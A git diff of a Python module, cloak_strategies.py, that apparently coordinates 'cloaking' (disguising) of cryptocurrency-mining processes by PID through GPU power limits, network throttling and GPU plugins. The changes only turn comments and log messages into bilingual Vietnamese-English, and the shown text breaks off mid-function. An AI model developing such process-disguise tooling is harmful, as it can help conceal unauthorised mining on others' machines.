@@ -1,6 +1,6 @@
 """
-Module cloak_strategies.py - Các chiến lược cloaking cho tiến trình khai thác (đồng bộ).
-CHÚ Ý: Phiên bản này đã loại bỏ hoàn toàn chức năng restoration - chỉ cloaking.
+**Module cloak_strategies.py** - Các **cloaking strategies** (chiến lược ngụy trang – phương pháp che giấu) cho **mining processes** (tiến trình khai thác – quy trình đào coin) (đồng bộ).
+**CHÚ Ý**: Phiên bản này đã loại bỏ hoàn toàn chức năng **restoration** (khôi phục – phục hồi) - chỉ **cloaking** (ngụy trang – che giấu).
 """
 # type: ignore
 
@@ -10,25 +10,25 @@ import psutil
 import threading
 import time
 import random
-# ABC removed - no longer needed after removing CloakStrategy base class
+# **ABC removed** (đã xóa ABC – loại bỏ Abstract Base Classes) - không còn cần sau khi xóa **CloakStrategy base class** (lớp cơ sở CloakStrategy)
 from typing import Dict, List, Any, Optional, Type, cast, TYPE_CHECKING
 from pathlib import Path
 
 from .utils import MiningProcess, StrategyType
 
-# ✅ UNIFIED LOGGING: Use centralized logging system
+# ✅ **UNIFIED LOGGING** (ghi nhật ký thống nhất): Sử dụng **centralized logging system** (hệ thống ghi nhật ký tập trung – cơ chế log trung tâm)
 from .module_loggers import get_gpu_cloaking_logger
 
-# ✅ ERROR MANAGEMENT: Use centralized error handling system
+# ✅ **ERROR MANAGEMENT** (quản lý lỗi): Sử dụng **centralized error handling system** (hệ thống xử lý lỗi tập trung – cơ chế quản lý ngoại lệ trung tâm)
 from .error_management import get_error_reporter, ErrorCode, ErrorSeverity, report_error
 
-# ✅ STANDARDIZED: Get unified logger instance (khớp hierarchy)
+# ✅ **STANDARDIZED** (chuẩn hóa): Lấy **unified logger instance** (thực thể logger thống nhất – đối tượng ghi nhật ký đồng bộ) (khớp **hierarchy** – phân cấp)
 cloak_logger = get_gpu_cloaking_logger()
 
-# ✅ ERROR REPORTER: Get centralized error reporter instance
+# ✅ **ERROR REPORTER** (báo cáo lỗi): Lấy **centralized error reporter instance** (thực thể báo cáo lỗi tập trung – đối tượng báo lỗi trung tâm)
 error_reporter = get_error_reporter()
 
-# **GPU-Only Mode**: CPU ResourceManager removed for GPU-only operations
+# **GPU-Only Mode** (chế độ chỉ GPU – hoạt động riêng card đồ họa): **CPU ResourceManager removed** (đã xóa trình quản lý tài nguyên CPU) cho **GPU-only operations** (hoạt động chỉ GPU – thao tác riêng card đồ họa)
 if TYPE_CHECKING:
     class GPUResourceManager: ...
     class NetworkResourceManager: ...
@@ -44,7 +44,7 @@ else:
 
 
 ###############################################################################
-#                         SIMPLIFIED CLOAK COORDINATOR                        #
+#                         **SIMPLIFIED CLOAK COORDINATOR** (BỘ ĐIỀU PHỐI NGỤY TRANG ĐƠN GIẢN HÓA)                        #
 ###############################################################################
 
 from .utils import CloakRequest, CloakResult
@@ -52,48 +52,48 @@ from .resource_control import HardwareController
 
 class CloakCoordinator:
     """
-    Simple coordinator - no complex factory or abstract strategies.
-    Pipeline Stage 2: Nhận CloakRequest từ ResourceManager -> Chọn strategy -> Gọi HardwareController.
+    **Simple coordinator** (bộ điều phối đơn giản – trình phối hợp cơ bản) - không có **complex factory** (factory phức tạp – nhà máy tạo đối tượng) hoặc **abstract strategies** (chiến lược trừu tượng – phương pháp tổng quát).
+    **Pipeline Stage 2** (Giai đoạn 2 của pipeline – bước 2 trong quy trình): Nhận **CloakRequest** (yêu cầu ngụy trang) từ **ResourceManager** (trình quản lý tài nguyên) -> Chọn **strategy** (chiến lược) -> Gọi **HardwareController** (bộ điều khiển phần cứng).
     """
     
     def __init__(self, config: Dict[str, Any]):
         """
-        Initialize CloakCoordinator với config.
+        **Initialize CloakCoordinator** (khởi tạo CloakCoordinator – thiết lập bộ điều phối ngụy trang) với **config** (cấu hình).
         
-        :param config: Configuration dictionary
+        :param config: **Configuration dictionary** (từ điển cấu hình – dict thiết lập)
         """
         self.config = config
-        self.logger = cloak_logger  # Use existing logger
+        self.logger = cloak_logger  # Sử dụng **existing logger** (logger hiện có – bộ ghi nhật ký sẵn có)
         
-        # Initialize hardware controller for Stage 3
+        # **Initialize hardware controller** (khởi tạo bộ điều khiển phần cứng) cho **Stage 3** (giai đoạn 3)
         self.hw_controller = HardwareController(config)
         
-        self.logger.info("[CS] CloakCoordinator initialized - Stage 2 ready")
+        self.logger.info("[CS] **CloakCoordinator initialized** (CloakCoordinator đã khởi tạo – bộ điều phối ngụy trang đã thiết lập) - **Stage 2 ready** (giai đoạn 2 sẵn sàng)")
     
     def process_request(self, request: CloakRequest) -> CloakResult:
-        """**Stage 2: Strategy Coordinator** (điều phối chiến lược)
+        """**Stage 2: Strategy Coordinator** (Giai đoạn 2: Điều phối chiến lược – bộ phối hợp phương pháp)
         
-        Trách nhiệm chính của Stage 2:
-        1. Quyết định strategy dựa trên config
-        2. Chuẩn bị params cho strategy đó
-        3. Forward đến hardware controller
+        **Trách nhiệm chính** (main responsibilities – nhiệm vụ chủ yếu) của **Stage 2** (giai đoạn 2):
+        1. Quyết định **strategy** (chiến lược) dựa trên **config** (cấu hình)
+        2. Chuẩn bị **params** (tham số) cho **strategy** đó
+        3. **Forward** (chuyển tiếp) đến **hardware controller** (bộ điều khiển phần cứng)
         
-        :param request: CloakRequest từ ResourceManager (chỉ có PID & metadata)
-        :return: CloakResult từ HardwareController
+        :param request: **CloakRequest** (yêu cầu ngụy trang) từ **ResourceManager** (trình quản lý tài nguyên) (chỉ có **PID** & **metadata** – mã tiến trình & siêu dữ liệu)
+        :return: **CloakResult** (kết quả ngụy trang) từ **HardwareController** (bộ điều khiển phần cứng)
         """
         try:
-            # Stage 2 decides strategy (not Stage 1!)
+            # **Stage 2** quyết định **strategy** (chiến lược) (không phải **Stage 1**!)
             strategy = request.strategy_name
             if not strategy:
-                # Auto-select strategy based on config
+                # **Auto-select strategy** (tự động chọn chiến lược) dựa trên **config** (cấu hình)
                 strategy = getattr(self.config, 'default_strategy', 'gpu')
-                self.logger.info(f"[CS] Auto-selected strategy '{strategy}' from config")
+                self.logger.info(f"[CS] **Auto-selected strategy** (đã tự động chọn chiến lược) '{strategy}' từ **config** (cấu hình)")
             
-            self.logger.info(f"[CS] Stage 2: Processing PID {request.pid} with strategy '{strategy}'")
+            self.logger.info(f"[CS] **Stage 2**: Đang xử lý **PID** {request.pid} (mã tiến trình) với **strategy** '{strategy}' (chiến lược)")
             
-            # Route to the correct strategy handler
+            # **Route** (định tuyến – chuyển hướng) đến **correct strategy handler** (bộ xử lý chiến lược đúng – trình xử lý phương pháp phù hợp)
             if strategy == 'gpu':
-                # Prepare GPU params from config
+                # Chuẩn bị **GPU params** (tham số GPU – thông số card đồ họa) từ **config** (cấu hình)
                 request.params = {
                     'gpu_index': 0,
                     'power_limit': getattr(self.config, 'gpu_power_limit', 150),
@@ -104,7 +104,7 @@ class CloakCoordinator:
                 return self._apply_gpu_strategy(request)
                 
             elif strategy == 'network':
-                # Prepare network params from config
+                # Chuẩn bị **network params** (tham số mạng – thông số kết nối) từ **config** (cấu hình)
                 request.params = {
                     'bandwidth_limit': getattr(self.config, 'network_bandwidth_limit', 100),
                     'interface': getattr(self.config, 'network_interface', 'eth0')
@@ -112,30 +112,30 @@ class CloakCoordinator:
                 return self._apply_network_strategy(request)
                 
             elif strategy == 'disk_io':
-                # Prepare disk I/O params (placeholder for now)
+                # Chuẩn bị **disk I/O params** (tham số I/O đĩa – thông số nhập/xuất ổ cứng) (**placeholder** for now – tạm thời để trống)
                 request.params = {}
                 return self._apply_disk_io_strategy(request)
                 
             elif strategy == 'cache':
-                # Prepare cache params (placeholder)
+                # Chuẩn bị **cache params** (tham số bộ nhớ đệm – thông số lưu trữ tạm) (**placeholder** – tạm thời để trống)
                 request.params = {}
                 return self._apply_cache_strategy(request)
                 
             elif strategy == 'memory':
-                # Prepare memory params (placeholder)
+                # Chuẩn bị **memory params** (tham số bộ nhớ – thông số RAM) (**placeholder** – tạm thời để trống)
                 request.params = {}
                 return self._apply_memory_strategy(request)
                 
             else:
-                self.logger.error(f"[CS] Unknown strategy: {strategy}")
+                self.logger.error(f"[CS] **Unknown strategy** (chiến lược không xác định – phương pháp không nhận diện được): {strategy}")
                 return CloakResult(
                     success=False,
                     pid=request.pid,
-                    error_msg=f"Unknown strategy: {strategy}"
+                    error_msg=f"**Unknown strategy** (chiến lược không xác định): {strategy}"
                 )
                 
         except Exception as e:
-            self.logger.error(f"[CS] Exception in process_request: {e}")
+            self.logger.error(f"[CS] **Exception in process_request** (ngoại lệ trong process_request – lỗi khi xử lý yêu cầu): {e}")
             return CloakResult(
                 success=False,
                 pid=request.pid,
@@ -143,56 +143,56 @@ class CloakCoordinator:
             )
     
     def _apply_gpu_strategy(self, request: CloakRequest) -> CloakResult:
-        """**Stage 2: Route GPU strategy với INTELLIGENT COORDINATOR**
+        """**Stage 2: Route GPU strategy** (Giai đoạn 2: Định tuyến chiến lược GPU) với **INTELLIGENT COORDINATOR** (bộ điều phối thông minh – trình phối hợp tự động)
         
-        ✅ ENHANCED: Sử dụng GpuCloakStrategy làm intelligent coordinator
-        để thêm các logic điều chỉnh động trước khi forward xuống HardwareController
+        ✅ **ENHANCED** (nâng cao): Sử dụng **GpuCloakStrategy** làm **intelligent coordinator** (bộ điều phối thông minh)
+        để thêm các **logic điều chỉnh động** (logic tự động điều chỉnh – thuật toán thích ứng) trước khi **forward** (chuyển tiếp) xuống **HardwareController** (bộ điều khiển phần cứng)
         
-        :param request: CloakRequest với GPU params đã được prepare ở Stage 1
-        :return: CloakResult từ HardwareController (qua intelligent coordinator)
+        :param request: **CloakRequest** (yêu cầu ngụy trang) với **GPU params** (tham số GPU) đã được **prepare** (chuẩn bị) ở **Stage 1** (giai đoạn 1)
+        :return: **CloakResult** (kết quả ngụy trang) từ **HardwareController** (qua **intelligent coordinator** – bộ điều phối thông minh)
         """
-        self.logger.info(f"[CS] 🎯 Routing GPU strategy via INTELLIGENT COORDINATOR for PID {request.pid}")
+        self.logger.info(f"[CS] 🎯 **Routing GPU strategy** (định tuyến chiến lược GPU – chuyển hướng phương pháp card đồ họa) qua **INTELLIGENT COORDINATOR** (bộ điều phối thông minh) cho **PID** {request.pid}")
         
         try:
-            # ✨ LAZY GPU PLUGIN ACTIVATION (Kích hoạt plugin GPU lười biếng)
-            # Chỉ kích hoạt một lần cho mỗi PID để tối ưu hiệu năng
+            # ✨ **LAZY GPU PLUGIN ACTIVATION** (Kích hoạt plugin GPU lười biếng – khởi động plugin card đồ họa theo yêu cầu)
+            # Chỉ kích hoạt một lần cho mỗi **PID** (mã tiến trình) để **tối ưu hiệu năng** (optimize performance – cải thiện hiệu suất)
             if not hasattr(self, '_gpu_plugins_activated'):
-                self._gpu_plugins_activated = set()  # Cache PIDs đã kích hoạt
+                self._gpu_plugins_activated = set()  # **Cache PIDs** (lưu trữ mã tiến trình – bộ nhớ đệm PID) đã kích hoạt
             
-            # Kiểm tra nếu PID chưa được kích hoạt plugins
+            # Kiểm tra nếu **PID** chưa được kích hoạt **plugins** (tiện ích mở rộng)
             if request.pid not in self._gpu_plugins_activated:
-                # Check config để enable/disable gpu_plugins
-                if getattr(self.config, 'enable_gpu_plugins', True):  # Default: True để auto-enable
+                # **Check config** (kiểm tra cấu hình) để **enable/disable** (bật/tắt) **gpu_plugins** (plugin GPU)
+                if getattr(self.config, 'enable_gpu_plugins', True):  # **Default: True** (mặc định: Đúng) để **auto-enable** (tự động bật)
                     try:
-                        # Lazy import - chỉ import khi thực sự cần
+                        # **Lazy import** (nhập khẩu lười biếng – import theo yêu cầu) - chỉ **import** khi thực sự cần
                         from mining_environment.gpu_plugins import apply_gpu_strategies
                         
-                        # Kích hoạt toàn bộ gpu_plugins cho PID này
-                        self.logger.info(f"[CS] 🔌 Activating GPU plugins for PID {request.pid}...")
+                        # Kích hoạt toàn bộ **gpu_plugins** (plugin GPU) cho **PID** này
+                        self.logger.info(f"[CS] 🔌 **Activating GPU plugins** (đang kích hoạt plugin GPU – khởi động tiện ích card đồ họa) cho **PID** {request.pid}...")
                         plugin_success = apply_gpu_strategies(request.pid)
                         
                         if plugin_success:
                             self._gpu_plugins_activated.add(request.pid)
-                            self.logger.info(f"[CS] ✅ GPU plugins successfully activated for PID {request.pid}")
-                            self.logger.debug(f"[CS] 📊 Total PIDs with plugins: {len(self._gpu_plugins_activated)}")
+                            self.logger.info(f"[CS] ✅ **GPU plugins successfully activated** (plugin GPU đã kích hoạt thành công) cho **PID** {request.pid}")
+                            self.logger.debug(f"[CS] 📊 **Total PIDs with plugins** (tổng số PID có plugin – tổng mã tiến trình đã cài tiện ích): {len(self._gpu_plugins_activated)}")
                         else:
-                            self.logger.warning(f"[CS] ⚠️ GPU plugins activation returned False for PID {request.pid}")
+                            self.logger.warning(f"[CS] ⚠️ **GPU plugins activation returned False** (kích hoạt plugin GPU trả về False – khởi động tiện ích thất bại) cho **PID** {request.pid}")
                     except ImportError as e:
-                        self.logger.warning(f"[CS] ⚠️ GPU plugins module not available: {e}")
+                        self.logger.warning(f"[CS] ⚠️ **GPU plugins module not available** (module plugin GPU không khả dụng – mô-đun tiện ích không tồn tại): {e}")
                     except Exception as e:
-                        self.logger.error(f"[CS] ❌ GPU plugins activation failed: {e}")
-                        # Continue anyway - plugins are enhancement, not critical
+                        self.logger.error(f"[CS] ❌ **GPU plugins activation failed** (kích hoạt plugin GPU thất bại – khởi động tiện ích lỗi): {e}")
+                        # **Continue anyway** (tiếp tục dù sao) - **plugins are enhancement** (plugin là tính năng nâng cao), **not critical** (không quan trọng)
                 else:
-                    self.logger.debug(f"[CS] 🔕 GPU plugins disabled by config")
+                    self.logger.debug(f"[CS] 🔕 **GPU plugins disabled by config** (plugin GPU bị tắt bởi cấu hình – tiện ích vô hiệu hóa theo thiết lập)")
             else:
-                self.logger.debug(f"[CS] ♻️ GPU plugins already activated for PID {request.pid}")
+                self.logger.debug(f"[CS] ♻️ **GPU plugins already activated** (plugin GPU đã được kích hoạt – tiện ích đã khởi động) cho **PID** {request.pid}")
             
-            # Check if GpuCloakStrategy is available as intelligent coordinator
+            # Kiểm tra nếu **GpuCloakStrategy** khả dụng làm **intelligent coordinator** (bộ điều phối thông minh)
             if hasattr(self, 'gpu_cloak_strategy') and self.gpu_cloak_strategy:
-                # USE INTELLIGENT COORDINATOR
-                self.logger.info("[CS] 🧠 Using GpuCloakStrategy as intelligent coordinator")
+                # **USE INTELLIGENT COORDINATOR** (sử dụng bộ điều phối thông minh)
+                self.logger.info("[CS] 🧠 **Using GpuCloakStrategy as intelligent coordinator** (đang dùng GpuCloakStrategy làm bộ điều phối thông minh – sử dụng chiến lược GPU như trình phối hợp tự động)")
                 
-                # Prepare request for intelligent coordinator
+                # Chuẩn bị **request** (yêu cầu) cho **intelligent coordinator** (bộ điều phối thông minh)
                 coordinator_request = {
                     'pid': request.pid,
                     'params': request.params
